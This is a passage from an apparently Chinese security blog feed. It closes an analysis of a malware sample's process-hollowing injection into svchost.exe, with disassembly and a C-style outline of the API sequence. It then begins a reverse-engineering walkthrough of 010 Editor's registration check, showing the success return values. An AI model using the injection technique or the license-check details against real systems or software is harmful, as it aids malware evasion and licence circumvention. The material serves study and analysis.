class=&quot;line&quot;&gt;.data:004FB88F myLocalSize3    dd offset sub_408A08    ; DATA XREF: .text:00403A06r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB893 myCreateProcessA dd offset sub_408A1E   ; DATA XREF: .text:00403DEEr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB897 myGetThreadContext dd offset sub_408A34 ; DATA XREF: sub_403FC0+C8r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB89B myReadProcessMemory dd offset sub_408A4A ; DATA XREF: sub_403FC0+2E9r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB89F myZwUnmapViewOfSection dd offset sub_408A60 ; DATA XREF: sub_403FC0+335r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8A3 myVirtualAllocEx dd offset sub_408A76   ; DATA XREF: sub_403FC0+3ACr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8A7 myWriteProcessMemory dd offset sub_408A8C ; DATA XREF: sub_403FC0+43Fr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8AB myLocalSize5    dd offset sub_408AA2    ; DATA XREF: sub_403FC0+9A7r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8AF myRtlMoveMemory_0 dd offset sub_408AB8  ; DATA XREF: sub_403FC0+B0Er&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8B3 myVirtualProtectEx dd offset sub_408ACE ; DATA XREF: sub_403FC0+D60r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8B7 myWriteProcessMemory_0 dd offset sub_408AE4 ; DATA XREF: sub_403FC0+DD2r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8BB mySetThreadContext dd offset sub_408AFA ; DATA XREF: sub_403FC0+FA8r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8BF myResumeThread  dd offset sub_408B10    ; DATA XREF: sub_403FC0+1172r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8C3 myWaitForSingleObject dd offset sub_408B26 ; DATA XREF: sub_403FC0+11ADr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8C7 myCloseHandle_  dd offset sub_408B3C    ; DATA XREF: sub_403FC0+11E6r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8CB myGetEnvironmentVariableA dd offset sub_408B52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8CF myTerminateProcess dd offset sub_408B68 ; DATA XREF: sub_4053DE+1Er&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8D3 myReadFileEx    dd offset sub_408B7E    ; DATA XREF: sub_405FAA+1E2r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8D7 myGetFileSize   dd offset sub_408B94    ; DATA XREF: sub_4063B0+DFr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8DB myCloseHandle   dd offset sub_408BAA    ; DATA XREF: sub_4064C4+1Dr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.data:004FB8DF myLocalFree     dd offset sub_408BC0    ; DATA XREF: sub_4065D9+541r&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;获取函数的代码结构：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;.text:004089B0 myLocalSize     proc near               ; CODE XREF: .text:00402CACp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:004089B0                                         ; DATA XREF: .data:myLocalSize1o&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:004089B0                 push    offset myLocalSize1 ; int&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:004089B5                 push    offset aLocalsize ; &amp;quot;LocalSize&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:004089BA                 push    offset aKernel32 ; &amp;quot;kernel32&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:004089BF                 call    myGetProc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:004089C4                 jmp     eax&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.text:004089C4 myLocalSize     endp&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后基本总结了myWork的代码逻辑，也一窥了进程注入的猥琐：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;CreateProcessA(0, &amp;quot;svchost.exe&amp;quot;, 0, 0, 0, 4/*CREATE_SUSPENDED*/, 0, 0, &amp;amp;sa, &amp;amp;pi );//按suspend创建进程，这样主线程就会挂起，等待后面的宰割&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;GetThreadContext(pi.hThread, &amp;amp;context);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ReadProcessMemory(pi.hProcess, 0x7ffde008/*peb-&amp;gt;ImageBaseAddress*/, buf, 4, &amp;amp;size); /*获取到的是img基地址 peb-&amp;gt;ImageBaseAddress*/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ZwUnmapViewOfSection(pi.hProcess, buf);//这里有个bug，buf传递方式错误，导致无法unmap，应该是&amp;amp;buf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;VirtualAllocEx(pi.hProcess, 0x400000, size, MEM_COMMIT|MEM_RESERVE/*0x3000*/, PAGE_READWRITE/**4/ );&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//解析PE文件，写入进程对应位置&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;WriteProcessMemory(pi.hProcess, 0x400000, buf, 0x1000, &amp;amp;size);//写入头部&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;for(i =0 ;i&amp;lt;num_of_sec; i++)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    WriteProcessMemory(pi.hProcess, 0x400000+sec[i].va, buf, sec[i].size, &amp;amp;size);//.text, .rdata, .data&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    VirtualProtectEx(pi.hProcess, 0x400000+sec[i].va, sec[i].size, NewProtect, &amp;amp;oldProtect);//PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//重写eop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//重写基地址&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;WriteProcessMemory(pi.hProcess, 0x7ffde008/*peb-&amp;gt;ImageBaseAddress*/, MyBaseAddr, 4, &amp;amp;size);//写入我的img 基地址 0x400000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;SetThreadContext(pi.hProcess, context);//恢复&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ResumeThread(pi.hThread);//恢复线程执行&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&quot;3-总结&quot;&gt;&lt;a href=&quot;#3-总结&quot; class=&quot;headerlink&quot; title=&quot;3. 总结&quot;&gt;&lt;/a&gt;&lt;strong&gt;3. 总结&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;本来打算完整分析一下的，在分析到进程注入时，由于自己代码实现中，遇到了一些问题，调试无语，eop和基地址都改写了，那么就是映射section遇到问题，终于修改成&lt;br&gt;直接pe完整写入宿主进程，成功执行了注入进程的功能。&lt;br&gt;所以，后面也没时间具体分析样本的功能了。&lt;br&gt;测试了该方式，无法过掉主防，在WriteProcessMemory就会被拦截，所以该方式基本只是作为技术研究，直接使用，还需努力。&lt;/p&gt;
&lt;h1 id=&quot;4-参考&quot;&gt;&lt;a href=&quot;#4-参考&quot; class=&quot;headerlink&quot; title=&quot;4. 参考&quot;&gt;&lt;/a&gt;&lt;strong&gt;4. 参考&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;[1] &lt;a href=&quot;http://www.cnblogs.com/lbq1221119/archive/2008/07/22/1248706.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/lbq1221119/archive/2008/07/22/1248706.html&lt;/a&gt;&lt;br&gt;[2] &lt;a href=&quot;http://blog.csdn.net/darthas/article/details/12569443&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/darthas/article/details/12569443&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-起因&quot;&gt;&lt;a href=&quot;#1-起因&quot; class=&quot;headerlink&quot; title=&quot;1. 起因&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 起因&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;某次卡饭hips浏览中，看到某高大上进程注入方式(主要是某人头发长)，惊为天人，技术堪称猥琐之王(抬高了？)，额。。。不捧了。由于没有样本，也没有搜索到资料，只能作罢。&lt;br&gt;某天，突然来了兴致，要分析个样本，随便在卡饭样本区下了个感觉挺啥啥的样本，一分析，你妹，咋这么熟悉呢，居然就是同类的进程注入，然后某人就有了下面的文章。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://anhkgg.github.io/categories/security/"/>
    
    
      <category term="inject process" scheme="http://anhkgg.github.io/tags/inject-process/"/>
    
      <category term="reverse" scheme="http://anhkgg.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>010注册算法分析</title>
    <link href="http://anhkgg.github.io/010%E6%B3%A8%E5%86%8C%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/"/>
    <id>http://anhkgg.github.io/010注册算法分析/</id>
    <published>2014-11-17T02:13:19.000Z</published>
    <updated>2016-07-07T04:32:12.042Z</updated>
    
    <content type="html">&lt;h2 id=&quot;1-关键函数定位&quot;&gt;&lt;a href=&quot;#1-关键函数定位&quot; class=&quot;headerlink&quot; title=&quot;1. 关键函数定位&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 关键函数定位&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;进入register窗口，随便填入name，然后check license，弹框信息”Invalid name or password. Please enter your name and password exactly as given when you purchased 010 Editor (make sure no quotes are included).”，通过该信息在IDA中找到对应函数地址，基本可以确认是关键函数位置，函数居然有名字，这是作者故意留下的吗。下面是整个验证函数流程：&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;void __usercall chekc(char a1&amp;lt;zf&amp;gt;, int a2&amp;lt;ecx&amp;gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//获取用户名&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//是否为空&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//获取注册码&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//是否为空&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//注册码格式检查xxxx-xxxx-xxxx-xxxx-xxxx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	v42 = (void *)myCheck(mygbName, 3u, &amp;apos;9A&amp;apos;); //注册码验证，返回值v42对于是否注册成功，有很大关系，返回值为231，为失败&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	v26 = mySecondCheck(mygbName, 3u, &amp;apos;9A&amp;apos;);  // 第二次检查，如果返回中为219，就会进入后面的注册成功提示&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//myCheck中返回不等于231，mygbName + 44提示进入网络验证，没有弄清楚，哪里会等于1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if ( v42 != (void *)231 &amp;amp;&amp;amp; *(_DWORD *)(mygbName + 44) )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		v27 = myWebCheck((void *)mygbName, 0);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		if(v27 &amp;lt; 0 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			v43 = myMsg(&amp;quot;Could not contact the webserver. Please check your internet connection. If your internet connection is currently working, the server may be down. If this problem persists, please visit &amp;apos;http://www.sweetscape.com/support/&amp;apos; (&amp;quot;, 0xFFFFFFFFu);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		if ( !v27 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;			v43 = myMsg( &amp;quot;010 Editor has detected that you have entered an invalid license. Please check to see if your license is entered correctly and try again. If this problem persists, please visit &amp;apos;http://www.sweetscape.com/support/&amp;apos;.&amp;quot;, 0xFFFFFFFFu);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		v33 = mySecondCheck(mygbName, 3u, &amp;apos;9A&amp;apos;);//网络验证是否成功，成功，返回219&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if ( v43 == (void *)219 )                     // v43 == 219，注册成功&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		v43 = myMsg(&amp;quot;Password accepted. Thank you for purchasing 010 Editor!&amp;quot;, 0xFFFFFFFFu);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		//写入注册表&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;2-算法分析&quot;&gt;&lt;a href=&quot;#2-算法分析&quot; class=&quot;headerlink&quot; title=&quot;2. 算法分析&quot;&gt;&lt;/a&gt;&lt;strong&gt;2. 算法分析&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;下面看看主要的验证函数myCheck和mySecondCheck，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;signed int __thiscall mySecondCheck(int this, unsigned int a2, unsigned int a3)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v3; // esi@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  signed int result; // eax@2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v5; // eax@3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v6; // eax@6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int v7; // eax@9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v3 = this;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( *(_DWORD *)(this + 44) )                 // 要让这个值等于0，否则进入网络验证，初始化就是0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return 275;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v5 = myCheck(this, a2, a3);	//可以看到，只有返回值是45时，才能返回219，注册成功&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( v5 == 45 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	result = 219;                               // 返回219， 注册成功&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以看到，只有返回值是45时，才能返回219，注册成功。&lt;br&gt;那么返回myCheck看看，怎么才能得到45的返回值，整个返回值查看一下，只有两处位置，可能返回45，如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;if ( v26 == 0x9Cu )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	v20 = *(_DWORD *)(regdlg + 28) &amp;lt; a2;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	return (-v20 &amp;amp; 0x21) + 45;                  // 成功？&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if ( v26 != 0xFCu )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	if ( v26 == 0xACu &amp;amp;&amp;amp; v33 )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	  v20 = v33 &amp;lt; a3;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	  return (-v20 &amp;amp; 0x21) + 45;                // 成功？&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;return 231;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;那么就需要回溯回去，看看v26，是如何得到的，只有在v26等于0x9c或者0xAc时，才有可能注册成功。下面看看完整代码：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;71&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;73&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;74&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;int __thiscall myCheck(int this, unsigned int a2, unsigned int a3)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//name和key长度是否为0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//myPassCheck(this, (int)&amp;amp;v23);//将key字符串转换成数值，每两个字符转化成2为十六进制数，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	